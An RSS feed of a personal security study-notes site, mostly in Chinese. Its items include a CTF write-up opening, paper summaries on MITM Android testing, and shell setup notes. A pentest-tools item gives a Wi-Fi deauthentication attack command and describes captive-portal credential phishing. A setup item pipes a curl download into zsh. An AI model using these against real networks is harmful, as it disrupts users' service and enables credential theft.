<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>https://bernie6401.github.io/docs/security/practice/crewctf/reverse/crewctf---ohphp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/reverse/crewctf---ohphp/</guid><description>&lt;h1 id="crewctf---ohphp">
 CrewCTF - OhPHP
 &lt;a class="anchor" href="#crewctf---ohphp">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.wibibi.com/info.php?tid=96">PHP - substr()&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>&lt;code>substr( $string , $start , $length )&lt;/code>
&lt;code>$strting&lt;/code> 是原始的字串，&lt;code>$start&lt;/code> 是要開始擷取的位置，&lt;code>$length&lt;/code> 則為要截取的字串長度，要注要的是 &lt;code>$start&lt;/code> 與 $length 都必須為數字才有作用，可以是正整數，也可以是負整數，以下提供幾個範例參考。
:::&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://www.runoob.com/php/func-string-strstr.html">PHP - strstr()&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>查找 &amp;ldquo;world&amp;rdquo; 在 &amp;ldquo;Hello world!&amp;rdquo; 中是否存在，如果是，返回該字符串及後面剩餘部分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">strstr&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Hello world!&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>); &lt;span style="color:#75715e">// 輸出 world!
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
:::&lt;/li>
&lt;li>&lt;a href="https://www.runoob.com/php/func-string-strrev.html">PHP - strrev()&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>反轉字符串 &amp;ldquo;Hello World!&amp;quot;：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">strrev&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Hello world!&amp;#34;&lt;/span>); &lt;span style="color:#75715e">// 輸出!dlroW olleH 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
:::&lt;/li>
&lt;li>&lt;a href="https://www.w3school.com.cn/php/func_string_strnatcmp.asp">PHP strnatcmp()&lt;/a>
:::spoiler
&lt;blockquote>
&lt;p>使用&amp;quot;自然&amp;quot;算法來比較兩個字符串（區分大小寫）：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">strnatcmp&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;2Hello world!&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;10Hello world!&amp;#34;&lt;/span>); &lt;span style="color:#75715e">// 輸出-1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">strnatcmp&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;10Hello world!&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;2Hello world!&amp;#34;&lt;/span>); &lt;span style="color:#75715e">// 輸出+1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>strnatcmp() 函數使用一種&amp;quot;自然&amp;quot;算法來比較兩個字符串。
在自然算法中，數字 2 小於數字 10。在計算機排序中，10 小於 2，這是因為 10 中的第一個數字小於 2。
:::&lt;/p></description></item><item><title/><link>https://bernie6401.github.io/docs/tools/ctf/all-pentest-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/all-pentest-tools/</guid><description>&lt;h1 id="all-pentest-tools">
 All Pentest Tools
 &lt;a class="anchor" href="#all-pentest-tools">#&lt;/a>
&lt;/h1>
&lt;p>可以參考以下論文，裡面有詳細說明Vulnerability Assessment and Penetration Testing (VAPT)會使用到的工具有哪些
:::info
Ravindran, U., &amp;amp; Potukuchi, R. V. (2022). A Review on Web Application Vulnerability Assessment and Penetration Testing. Review of Computer Engineering Studies, 9(1).
:::&lt;/p>
&lt;h1 id="wireless-related">
 Wireless Related
 &lt;a class="anchor" href="#wireless-related">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>大部分都會用到&lt;a href="https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/">Aircrack&lt;/a>這個工具&lt;/li>
&lt;li>Deauthentication - &lt;a href="http://atic-tw.blogspot.com/2014/01/airodump-ng.html">airodump-ng教學&lt;/a> / &lt;a href="http://atic-tw.blogspot.com/2014/01/aireplay-ng6.html">aireplay-ng教學&lt;/a>
攻擊說明: &lt;a href="https://ithelp.ithome.com.tw/articles/10218551?sc=rss.iron">[Day 05]資安百物語：第二談：現代飛頭蠻的反制法-反無人機技術(下) &lt;/a>
&lt;ol>
&lt;li>Scan
將掃描範圍縮小到一個目標，並取得連接到目標網路的裝置的MAC位址。
&lt;pre tabindex="0">&lt;code>$ airodump-ng -bSSID &amp;lt;bssid&amp;gt; --ch &amp;lt;channels&amp;gt; WLAN0mon
# 此命令用於通過識別 BSSID（基本服務集識別符）和所使用的通道來設置目標網路上的掃描
# -c: 指定只接收特定的 channels，如果有多個 channel，用 , 分隔，例如：-c 6,8,10,11
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Attack
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aireplay-ng --deauth &amp;lt;count, e.g. 1000&amp;gt; -a &amp;lt;bssid, e.g. 6A:BF:C4:06:35:94&amp;gt; -c &amp;lt;AP MAC address, e.g 34:CF:F6:96:72:E2&amp;gt; wlan0mon
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -c dmac : 指定 Client 的 MAC address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -a bssid : 指定 AP 的 MAC address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --deauth: count 是指執行阻斷的次數，如果設為 0 表循環攻擊，Client 將無法上網。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>Fluxion
攻擊說明與工具教學: &lt;a href="https://www.cnblogs.com/xuanhun/p/5783836.html">實戰-Fluxion與wifi熱點偽造、釣魚、中間人攻擊、wifi破解&lt;/a>，Fluxion 攻擊的主要目標是獲取目標 Wi-Fi 網路使用者使用的密碼或訪問憑據。此攻擊可使攻擊者未經授權訪問目標網路，而有關於Captive Portal(WEB Portal)的驗證流程可以參考&lt;a href="https://ithelp.ithome.com.tw/articles/10280421">這篇&lt;/a>
&lt;ol>
&lt;li>Captive Portal Attack
根據前面的background可以知道web portal的驗證流程，那如果把原本的hotspot換成一個假的hotspot，讓使用者誤以為這是真的驗證頁面(需要帳號密碼之類的)，那我們就有機會拿到credentials session&lt;/li>
&lt;li>直接取得SSID/BSSID/Channel Used/Password Used/Type of Security Applied&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>MITM - &lt;a href="https://blog.csdn.net/chinabyxl/article/details/121463891">Xerosploit教學&lt;/a>
Sniff模組允許攻擊者監控通過目標Wi-Fi網路的數據流量，包括使用者發送的數據。通過監視此類流量，攻擊者可以竊取身份驗證憑據、個人資訊或其他敏感數據等資訊，sniff完了以後可以用wireshark打開看流量&lt;/li>
&lt;li>WEP/WPA Attack
WEP/WPA 注入攻擊是針對使用 WEP/WPA 安全協定的無線網路的針對性攻擊。此攻擊旨在滲透網路安全並獲得對透過網路傳輸的資料流量的未經授權的存取。一旦收集到加密的流量數據，攻擊者就可以分析該數據的模式和結構，以識別網路中使用的加密金鑰。透過取得加密金鑰，攻擊者可以破解透過網路發送的資料流量的加密。
&lt;ol>
&lt;li>Handshake on the target Wi-Fi network&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>DoS - Aircrack的Wi-Fi DoS攻擊&lt;/li>
&lt;/ul>
&lt;h1 id="web-related">
 Web Related
 &lt;a class="anchor" href="#web-related">#&lt;/a>
&lt;/h1>
&lt;p>以下分類是按照OWASP的Pentest框架順序分類&lt;/p></description></item><item><title>/wp-admin VS /wp-content VS /wp-include VS /wp-json</title><link>https://bernie6401.github.io/docs/problem-solutions/_wp-admin-vs-_wp-content-vs-_wp-include-vs-_wp-json/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/_wp-admin-vs-_wp-content-vs-_wp-include-vs-_wp-json/</guid><description>&lt;h1 id="wp-admin-vs-wp-content-vs-wp-include-vs-wp-json">
 /wp-admin VS /wp-content VS /wp-include VS /wp-json
 &lt;a class="anchor" href="#wp-admin-vs-wp-content-vs-wp-include-vs-wp-json">#&lt;/a>
&lt;/h1>
&lt;p>From Chat-GPT:&lt;/p>
&lt;h3 id="1-wp-admin">
 1. &lt;strong>&lt;code>wp-admin&lt;/code>&lt;/strong>
 &lt;a class="anchor" href="#1-wp-admin">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>用途&lt;/strong>: WordPress 的後台管理系統。&lt;/li>
&lt;li>&lt;strong>位置&lt;/strong>: &lt;code>/wp-admin/&lt;/code>&lt;/li>
&lt;li>&lt;strong>內容&lt;/strong>:
&lt;ul>
&lt;li>包含所有與管理後台相關的 PHP 文件（如控制面板、用戶管理、文章管理等）。&lt;/li>
&lt;li>提供網站管理者的操作界面。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>訪問權限&lt;/strong>: 需要用戶登錄並具備管理員或其他授權身份才能訪問。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>範例&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>http://example.com/wp-admin/&lt;/code>：進入 WordPress 後台儀表板。&lt;/li>
&lt;li>&lt;code>http://example.com/wp-admin/post-new.php&lt;/code>：進入新增文章頁面。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="2-wp-content">
 2. &lt;strong>&lt;code>wp-content&lt;/code>&lt;/strong>
 &lt;a class="anchor" href="#2-wp-content">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>用途&lt;/strong>: 儲存用戶生成的內容和可定制項目。&lt;/li>
&lt;li>&lt;strong>位置&lt;/strong>: &lt;code>/wp-content/&lt;/code>&lt;/li>
&lt;li>&lt;strong>內容&lt;/strong>:
&lt;ul>
&lt;li>主題 (&lt;code>themes&lt;/code>)：網站外觀的所有文件。&lt;/li>
&lt;li>外掛 (&lt;code>plugins&lt;/code>)：網站功能擴展的所有文件。&lt;/li>
&lt;li>上傳 (&lt;code>uploads&lt;/code>)：用戶上傳的媒體文件（圖片、影片等）。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>訪問權限&lt;/strong>: 通常開放訪問，因為靜態文件（如圖片或 CSS 文件）需要公開存取。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>範例&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>http://example.com/wp-content/uploads/2025/01/image.jpg&lt;/code>：上傳的圖片文件。&lt;/li>
&lt;li>&lt;code>http://example.com/wp-content/themes/my-theme/style.css&lt;/code>：主題樣式文件。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="3-wp-includes">
 3. &lt;strong>&lt;code>wp-includes&lt;/code>&lt;/strong>
 &lt;a class="anchor" href="#3-wp-includes">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>用途&lt;/strong>: 儲存 WordPress 核心功能的代碼。&lt;/li>
&lt;li>&lt;strong>位置&lt;/strong>: &lt;code>/wp-includes/&lt;/code>&lt;/li>
&lt;li>&lt;strong>內容&lt;/strong>:
&lt;ul>
&lt;li>包含 WordPress 核心的 PHP 函數庫和類。&lt;/li>
&lt;li>負責處理網站的內部邏輯，包括模板標籤、格式化工具和 API 的核心部分。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>訪問權限&lt;/strong>: 通常禁止直接訪問這些文件，因為它們是內部功能實現的核心部分。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>範例&lt;/strong>:&lt;/p></description></item><item><title>`sudo chmod 777 -R /usr` Problem</title><link>https://bernie6401.github.io/docs/problem-solutions/sudo-chmod-777--r-_usr-problem/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/sudo-chmod-777--r-_usr-problem/</guid><description>&lt;h1 id="sudo-chmod-777--r-usr-problem">
 &lt;code>sudo chmod 777 -R /usr&lt;/code> Problem
 &lt;a class="anchor" href="#sudo-chmod-777--r-usr-problem">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-problem-solution">
 tags: &lt;code>problem solution&lt;/code>
 &lt;a class="anchor" href="#tags-problem-solution">#&lt;/a>
&lt;/h6>
&lt;p>&lt;a href="https://www.cnblogs.com/silentdoer/p/8946946.html">解决普通用户sudo时出现/usr/bin/sudo must be owned by uid 0 and have the setuid bit set&lt;/a>&lt;/p>
&lt;p>If you forget root password:
&lt;a href="https://blog.csdn.net/ACK_ACK/article/details/106320127">su Authentication failure解决方法&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.csdn.net/Tangramor/article/details/120358727">WSL2 的 /etc/sudoers 文件改错后：/etc/sudoers: syntax error near line 30&lt;/a>
&lt;a href="https://askubuntu.com/questions/816732/how-to-change-default-user-in-wsl-ubuntu-bash-on-windows-10">How to change default user in WSL Ubuntu bash on Windows 10&lt;/a>
&lt;img src="https://i.imgur.com/UwBX8O2.png" alt="" />&lt;/p>
&lt;p>&lt;a href="https://blog.csdn.net/lileihappy/article/details/79214156">sudo: error in /etc/sudo.conf, line 0 while loading plugin &amp;lsquo;sudoers_policy&amp;rsquo;&lt;/a>&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://github.com/zsh-users/zsh-completions/issues/433">zsh compinit: insecure directories and files, run compaudit for list.&lt;/a>
&lt;a href="https://blog.csdn.net/Bronze5/article/details/109449532">zsh报错：_complete:96: bad math expression: operand expected at end of string&lt;/a>&lt;/p></description></item><item><title>~/.zshrc &amp; Initial Library</title><link>https://bernie6401.github.io/docs/problem-solutions/~_.zshrc--initial-library/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/~_.zshrc--initial-library/</guid><description>&lt;h1 id="zshrc--initial-library">
 ~/.zshrc &amp;amp; Initial Library
 &lt;a class="anchor" href="#zshrc--initial-library">#&lt;/a>
&lt;/h1>
&lt;h2 id="zsh">
 Zsh
 &lt;a class="anchor" href="#zsh">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt install zsh gawk git -y
$ sudo apt update; sudo apt upgrade -y; sudo apt install curl binutils vim npm -y
$ chsh -s /bin/zsh
$ curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh
$ vim ~/.zshrc
# Add these lines in .zshrc
# Lines configured by zsh-newuser-install
HISTFILE=~/.histfile
HISTSIZE=1000
SAVEHIST=1000
bindkey -e
# End of lines configured by zsh-newuser-install
# The following lines were added by compinstall
zstyle :compinstall filename &amp;#39;/home/sbk6401/.zshrc&amp;#39;

autoload -Uz compinit
compinit
# End of lines added by compinstall

# Delete all temp download files
alias ll=&amp;#34;ls -al&amp;#34;
find . -name &amp;#34;*:Zone.Identifier&amp;#34; -type f -delete
export ZSH=&amp;#34;$HOME/.zplug/repos/robbyrussell/oh-my-zsh&amp;#34;
ZSH_THEME=&amp;#34;robbyrussell&amp;#34;
ZSH_THEME=&amp;#34;powerlevel10k/powerlevel10k&amp;#34;
source ~/.zplug/init.zsh
npm install -g tldr

# zplug plugins
zplug &amp;#34;romkatv/powerlevel10k&amp;#34;, as:theme, depth:1
zplug &amp;#39;zplug/zplug&amp;#39;, hook-build:&amp;#39;zplug --self-manage&amp;#39;
zplug &amp;#34;zsh-users/zsh-autosuggestions&amp;#34;

if ! zplug check --verbose; then
	printf &amp;#34;Install? [y/N]: &amp;#34;
	if read -q; then
	
		echo; zplug install
	else
		echo
	fi
fi

zplug load

# To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>客製化 zshrc
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">source ~/anaconda3/bin/activate CTF
cd /mnt/d/NTU/CTF/PicoCTF/
alias ll=&amp;#39;ls -al&amp;#39;
alias gccc=&amp;#39;gcc -Wl,--dynamic-linker=/usr/src/glibc/glibc_dbg/elf/ld.so -g&amp;#39;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="gdb-gef">
 gdb-gef
 &lt;a class="anchor" href="#gdb-gef">#&lt;/a>
&lt;/h2>
&lt;p>Touch 2 files&lt;/p></description></item><item><title>$\LaTeX$ 語法筆記</title><link>https://bernie6401.github.io/docs/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/</guid><description>&lt;blockquote>
&lt;p>HackMD 是透過 MathJax 支援 $\LaTeX$ ，雖未支援所有語法，對多數人應已足夠，一起把 Web 上醜死的公式換成美美的吧～&lt;/p>&lt;/blockquote>
&lt;h1 id="latex-語法筆記">
 $\LaTeX$ 語法筆記
 &lt;a class="anchor" href="#latex-%e8%aa%9e%e6%b3%95%e7%ad%86%e8%a8%98">#&lt;/a>
&lt;/h1>
&lt;p>$$
\LaTeX % 大小寫須正確
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\LaTeX % 大小寫須正確

$\textstyle$
$$\displaystyle$$
%comment
&lt;/code>&lt;/pre>&lt;p>$$
\grave apple % 標重音
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\grave apple % 標重音
&lt;/code>&lt;/pre>&lt;p>$$
{\bf AB} % 粗體 boldface
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>{\bf AB} % 粗體 boldface
&lt;/code>&lt;/pre>&lt;p>$$
\bar{A}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\bar{A}
&lt;/code>&lt;/pre>&lt;p>$$
{ a+b \brace c+d }
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>{ a+b \brace c+d }
&lt;/code>&lt;/pre>&lt;p>$$
\overline{AB}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\overline{AB}
&lt;/code>&lt;/pre>&lt;p>$$
\vec{v}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\vec{v}
&lt;/code>&lt;/pre>&lt;p>$$
\frac{b}{a}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\frac{b}{a}
% 或
{b \over a}
&lt;/code>&lt;/pre>&lt;p>$$
\dfrac{b}{a}
$$&lt;/p></description></item><item><title>A Hybrid Facial Expression Recognition System Based on Facial Features and Pose Estimation</title><link>https://bernie6401.github.io/docs/side-project/a-hybrid-facial-expression-recognition-system-based-on-facial-features-and-pose-estimation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/side-project/a-hybrid-facial-expression-recognition-system-based-on-facial-features-and-pose-estimation/</guid><description>&lt;h1 id="a-hybrid-facial-expression-recognition-system-based-on-facial-features-and-pose-estimation">
 A Hybrid Facial Expression Recognition System Based on Facial Features and Pose Estimation
 &lt;a class="anchor" href="#a-hybrid-facial-expression-recognition-system-based-on-facial-features-and-pose-estimation">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntust-emotional-recognition-openpose-pytorch-special-topic">
 tags: &lt;code>NTUST&lt;/code> &lt;code>Emotional Recognition&lt;/code> &lt;code>Openpose&lt;/code> &lt;code>PyTorch&lt;/code> &lt;code>Special Topic&lt;/code>
 &lt;a class="anchor" href="#tags-ntust-emotional-recognition-openpose-pytorch-special-topic">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="author">
 Author
 &lt;a class="anchor" href="#author">#&lt;/a>
&lt;/h2>
&lt;p>JING-MING GUO&lt;sup>1&lt;/sup>, (Senior Member, IEEE), CHIH-HSIEN HSIA&lt;sup>2&lt;/sup>, (Member, IEEE), PING-HSUEH HO&lt;sup>1&lt;/sup>, (Bachelor), YANG-CHEN CHANG&lt;sup>1&lt;/sup>, (Bachelor)&lt;/p>
&lt;p>&lt;sup>1&lt;/sup>Department of Electrical Engineering, National Taiwan University of Science and Technology
Taipei City 106, Taipei County, Taiwan
&lt;sup>2&lt;/sup>Department of Computer Science and Information Engineering, National Ilan University, Yilan City 260, Yilan County, Taiwan&lt;/p></description></item><item><title>A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Apps of Power Industry</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-apps-of-power-industry/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-apps-of-power-industry/</guid><description>&lt;h1 id="a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-applications-of-power-industry">
 A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Applications of Power Industry
 &lt;a class="anchor" href="#a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-applications-of-power-industry">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Zhang, L., Wang, B., Shen, Q., Song, Y., Guo, N., &amp;amp; Xie, L. (2021, April). A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Applications of Power Industry. In 2021 IEEE 6th International Conference on Computer and Communication Systems (ICCCS) (pp. 743-747). IEEE.
:::
這一篇蠻有趣的，和我想要做的東西幾乎一樣，不過他論文闡述的重點不一樣，但也還是給我一些之後需要注意的地方，&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>他是站在電力相關的Android App的角度去審視如果利用MITM Based做到滲透測試要怎麼做，以及和傳統的方式相比可以減少多少時間、效率提升多少。但其實內文和電力幾乎一點關係也沒有，代換成其他的App也可以，如果我們要利用MITM Based做到Penetration Testing，就必須要手動克服中間會加密的問題，所以他就試圖提出一個==3-Layers Proxy Based==的東西(如下圖)
&lt;img src="https://hackmd.io/_uploads/B1TUn8oGA.png" alt="圖片" />
從上圖可知，手機到Web Server中間總共有三層的Proxy，第一和第三層都是MITM Proxy，主要是負責訊息的加解密，而中間的那一層就可以很彈性的替換成各式各樣的自動化測試工具或腳本，例如Burp Suite或是SQLMAP之類的
:::info
這個架構會需要三層其實是因為他所測試的App，不只是傳輸的那一層會被SSL加密，而在傳送的封包body還會再加密一次，所以需要三層，不然照理來說，一層的MITM Proxy就可以解決SSL加解密的問題，不需要用到三層那麼多，而且也不需要深入探索他用的是哪一套加解密演算法，因為傳輸層的演算法都一樣才對，這是和學長討論出來的結果
:::&lt;/p></description></item><item><title>A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/</guid><description>&lt;h1 id="a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications">
 A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications
 &lt;a class="anchor" href="#a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Lv, X., Peng, T., Tang, J., He, R., Hu, X., Jiang, M., &amp;hellip; &amp;amp; Cao, W. (2022, December). A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications. In 2022 18th International Conference on Mobility, Sensing and Networking (MSN) (pp. 408-416). IEEE.
:::
這一篇也和我想做的主題有一點關聯，他是利用MITMProxy-based達到偵測應用程式在做Hotfix時，有沒有Code Injection(dex injection)的問題。&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>現在有很多的App都會實現Hotfix這項技術，也就是不斷電更新，傳統的App更新方式為廠商發佈新的版本後，使用者需要重新卸載再安裝新的版本，但現在有了Hotfix的技術，使用者在沒有感知的情況下就會自動完成更新，如下圖所述，當然在更新之前會進行驗證Hash、SSL憑證和簽章，但如果沒有簽章呢?是不是就可以被MITM篡改Hash和進行Code Injection，這一篇文章就是在自動化的檢測這件事情的可行性
&lt;img src="https://hackmd.io/_uploads/SkTTS9hGA.png" alt="圖片" />&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Hotfix的流程
按照論文中的說明，利用hotfix更新patch的方式當然不是直接從server傳過來到client端，而是會把dex file打包成.jar或是.zip的patch package，然後放在某個地方。從server那邊會送出一個json file，裡面有一個URL Key會紀錄這個打包好的patch package在哪裡，然後client端自行去下載會來進行patch&lt;/li>
&lt;li>Android的簽章
在Android系統安全中有3個主要的技術: Permission Management, Signature Authentication, 以及Sandbox Mechanism，現在主要探討的問題就是在簽章的技術底下。Android的數位簽章總共會包含三個東西: MANIFEST.MF, CERT.SF, CERT.RSA
&lt;ul>
&lt;li>MANIFEST.MF
是一個Digest File也就是存所有更新的打包檔案的Hash Value&lt;/li>
&lt;li>CERT.SF
是一個Signature File，他會用SHA1計算MANIFEST.MF中的所有東西再用Base64進行Encode&lt;/li>
&lt;li>CERT.RSA
存放Public Key+加密演算法是哪一個+用自己的Private Key加密CERT.SF中的所有東西的結果
綜上所述，如果一個廠商在進行Hotfix更新時，被MITM Hijack，那MANIFEST.MF和CERT.SF可以被換掉，但CERT.RSA這個檔案，因為沒有廠商的私鑰，故無法替換&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="proposed-method">
 Proposed Method
 &lt;a class="anchor" href="#proposed-method">#&lt;/a>
&lt;/h2>
